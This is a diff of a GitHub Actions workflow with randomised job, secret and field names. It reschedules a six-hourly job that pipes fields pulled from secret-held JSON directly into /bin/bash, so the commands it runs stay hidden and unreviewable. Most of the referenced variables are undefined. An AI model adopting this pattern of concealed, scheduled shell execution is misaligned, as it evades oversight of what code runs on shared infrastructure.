@@ -2,7 +2,7 @@ name: qushubin2418
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: qushubin2418
         env:
-          vuqq4111: ${{ secrets.vuqq4111 }}
+          bjy2173: ${{ secrets.bjy2173 }}
         run: |
-          echo $vuqq4111 | jq -r .vydbf7369 | /bin/bash
-          echo $itpc96864 | jq -r .teol23602 | /bin/bash
-          echo $k68442 | jq -r .zrhcx6011 | /bin/bash
-          echo $pcxi6176 | jq -r .j3054 | /bin/bash
-          echo $fa680 | jq -r .hglpl8 | /bin/bash
-          echo $h8915 | jq -r .ucw91 | /bin/bash
-          echo $mcq21 | jq -r .qixrv7459 | /bin/bash
-          echo $d3 | jq -r .qfqo92 | /bin/bash
-          echo $nqsk234 | jq -r .jiiv787 | /bin/bash
-          echo $rbue9 | jq -r .viyv70 | /bin/bash
-          echo $jbv63132 | jq -r .tmr6 | /bin/bash
+          echo $bjy2173 | jq -r .r7532 | /bin/bash
+          echo $omef1 | jq -r .ulsmh549 | /bin/bash
+          echo $e56044 | jq -r .bwd98 | /bin/bash
+          echo $cweah5 | jq -r .nvg7 | /bin/bash
+          echo $iu3365 | jq -r .pvvdu6748 | /bin/bash
+          echo $yyilt366 | jq -r .w17 | /bin/bash
+          echo $rkthi424 | jq -r .z6 | /bin/bash
 
